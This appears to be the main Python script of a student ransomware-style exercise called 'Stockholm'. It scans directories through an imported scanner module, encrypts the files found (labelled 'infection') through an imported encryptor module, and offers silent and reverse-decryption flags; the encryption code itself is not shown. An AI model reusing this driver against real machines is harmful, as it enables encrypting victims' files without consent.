import argparse
from re import I
from scanner import *
from encryptor import *

# Main
def run():
    # Opciones de Flags
    args = config_args()
    # Evaluacion de Flags
    ## Infeccion de directorio
    if args.reverse == None and args.version == False:
        # Escaneo de Directorio
        res_scan = scan_files(silent=args.silent)
        if len(res_scan) > 0:
            # Cifrar Archivos
            encrypt_dirs(res_scan,silent=args.silent)
        else:
            if args.silent == False:
                print("FATAL ERROR -- INFECTION DISABLED!!")
    if args.version == True:
        print("Program version Stockholm-0.1")
    if args.reverse != None and args.version == False:
        print(args.reverse)
        pass
    
# Configuracion de Flags
def config_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r","--reverse",default=None,help="Reverse File Encryption.")
    parser.add_argument("-s","--silent",default=False,action='store_true',help="Silent mode, the program output is emitted.")
    parser.add_argument("-v","--version",default=False,action='store_true',help="Program version.")
    return parser.parse_args()

if __name__ == "__main__":
    run()